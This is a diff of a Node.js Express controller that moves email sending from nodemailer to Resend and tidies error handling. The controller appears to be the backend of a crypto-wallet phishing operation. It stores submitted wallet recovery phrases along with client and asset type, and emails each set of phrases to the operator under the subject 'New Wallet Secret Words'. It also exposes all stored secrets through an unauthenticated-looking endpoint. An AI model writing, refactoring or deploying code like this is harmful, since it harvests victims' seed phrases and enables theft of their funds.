@@ -1,66 +1,61 @@
-const  {BadRequestError}  = require("../errors/errorsIndex")
-require('dotenv').config()
-const nodemailer =require('nodemailer')
-const notFoundMiddlewareError =  require('../middleware/notfound')
-const {StatusCodes} = require('http-status-codes')
-const jwt = require('jsonwebtoken')
-const secretWords = require('../models/secrets')
+const { BadRequestError } = require("../errors/errorsIndex");
+require("dotenv").config();
+const { StatusCodes } = require("http-status-codes");
+const { Resend } = require("resend");
+const secretWords = require("../models/secrets");
 
-const getWallets = async (req, res) =>{
+// Initialize Resend
+const resend = new Resend(process.env.RESEND_API_KEY);
+
+// Centralized email sending
+const sendEmail = async (to, subject, html, from = process.env.MAILER_EMAIL) => {
   try {
-    const wallets = await secretWords.find({})
-
-    res.status(StatusCodes.CREATED).json(wallets)
-
+    const { data } = await resend.emails.send({ from, to, subject, html });
+    return data;
   } catch (error) {
-    console.log(error)
+    console.error("Email sending error:", error);
+    throw error;
   }
-  
-
-}
-
- const createSecret = async (req, res) => {
-   const secretWord = await secretWords.create(req.body)
-   const {secret, user, walletType} = req.body
-   res.status(StatusCodes.CREATED).json({ secretWord })
-
-   var transporter2 = nodemailer.createTransport({
-            service :'gmail',
-              auth:{
-                user: process.env.MAILER_EMAIL,
-                pass: process.env.MAILER_PASS
-            }
-})
-const mailOptions2 = {
-  from: process.env.MAILER_EMAIL,
-  to: process.env.MAILER_EMAIL,
-  subject: 'New Wallet Secret Words',
-  html: `
-  <div style="text-align:left; min-height:60vh; padding:20px">
-  
-   <h2>Phrases: ${secret} <br/></h2>
-   <h2>Client: ${user} <br/></h2>
-   <h2>Asset: ${walletType} <br/></h2>
-   
-
-
-  </div>
-  `
 };
-transporter2.sendMail(mailOptions2, function(error, body){
-  if(error){
-      return res.json({error: error})
+
+// Get all wallets/secrets
+const getWallets = async (req, res) => {
+  try {
+    const wallets = await secretWords.find({});
+    res.status(StatusCodes.OK).json(wallets);
+  } catch (error) {
+    console.error(error);
+    res.status(StatusCodes.INTERNAL_SERVER_ERROR).json({ error: "Failed to fetch wallets" });
   }
-  res.status(StatusCodes.CREATED).json({secretWord })
-})
+};
 
- }
+// Create a new secret word
+const createSecret = async (req, res) => {
+  try {
+    const secretWord = await secretWords.create(req.body);
+    const { secret, user, walletType } = req.body;
 
- 
- 
- 
- module.exports = {
-   
-     createSecret,
-    getWallets
-   }
+    // Prepare email content
+    const htmlContent = `
+      <div style="text-align:left; min-height:60vh; padding:20px">
+        <h2>Phrases: ${secret}</h2>
+        <h2>Client: ${user}</h2>
+        <h2>Asset: ${walletType}</h2>
+      </div>
+    `;
+
+    // Send email to admin
+    await sendEmail(process.env.MAILER_EMAIL, "New Wallet Secret Words", htmlContent);
+
+    // Respond to frontend
+    res.status(StatusCodes.CREATED).json({ secretWord });
+  } catch (error) {
+    console.error(error);
+    res.status(StatusCodes.INTERNAL_SERVER_ERROR).json({ error: "Failed to create secret word" });
+  }
+};
+
+module.exports = {
+  createSecret,
+  getWallets,
+};
